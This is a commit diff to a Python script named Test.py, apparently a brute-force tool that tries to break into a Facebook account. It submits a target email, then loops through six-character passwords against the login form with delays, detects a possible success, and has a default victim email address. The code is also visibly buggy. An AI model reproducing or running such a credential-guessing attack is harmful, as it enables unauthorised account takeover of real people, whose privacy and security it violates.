befea5ea549e6b9374d70df4131bafd59c4f3d00
krarktel112 <krarktel@gmail.com>
2024-09-24 12:29:37 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -26,22 +26,6 @@ def setup_browser(self):
     browser.set_handle_refresh(False)
     return browser
 
-def passcode6():
-  try:
-    f = open("6digits.txt", "a")
-    f.close()
-  except:
-    f = open("6digits.txt", "a+")
-    for combination in itertools.product(range(10), repeat=6):
-        f.write(''.join(map(str, combination)))
-  try:
-    z = open("8digits.txt", "a")
-    z.close()
-  except:
-    z = open("8digits.txt", "a+")
-    for combination in itertools.product(range(10), repeat=8):
-      z.write(''.join(map(str, combination)))
-
 def sleepy(counter):
   x = counter
   y = 0
@@ -69,26 +53,36 @@ def fb_hack(email, codex):
   browser.select_form(nr=0)
   browser.form['email'] = email 
   browser.submit()
-  """print(browser.geturl())
-  forms = list(browser.forms())
-  print(forms)"""
+  response1 = browser.response()
+  soup = BeautifulSoup(response1, 'html.parser')
+  check1 = soup.find(string("Try another way"))
+  check2 = soup.find(string("Try another way"))
   browser.select_form(nr=0)
-  browser.form['pass'] = str(1)
-  browser.submit()
   for combination in  itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
-    if counter < codex:
+    if counter <= codex:
       x = (''.join(map(str, combination)))
       codex += 1
     else:
       try:
-        x = (''.join(map(str, combination)))
-        browser.form['pass'] = x
-        test = (x, " failed")
-        sleepy(30)
-        counter += 1
-        yo = h.join(test)
-        response1 = browser.response()
-        soup = BeautifulSoup(response1, 'html.parser')  
+        while check1 != "None":
+          x = (''.join(map(str, combination)))
+          browser.form['pass'] = x
+          browser.submit()
+          test1 = (x, " Failed")
+          test2 = (x, " Succeded")
+          counter += 1
+          yo = h.join(test1)
+          yo2 = h.join(test2)
+          response1 = browser.response()
+          soup = BeautifulSoup(response1, 'html.parser')
+          check1 = soup.find(string("Try another way"))
+          if check1 == check2:
+            print(test1)
+            sleepy(30)
+          else:
+            print("Possible success")
+            print(test2)
+            raise
       except:
         response1 = browser.response()
         soup = BeautifulSoup(response1, 'html.parser')
@@ -101,5 +95,4 @@ def fb_hack(email, codex):
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 0)
-
-fb_hack(ehack, reset, sear)
+fb_hack(ehack, reset)
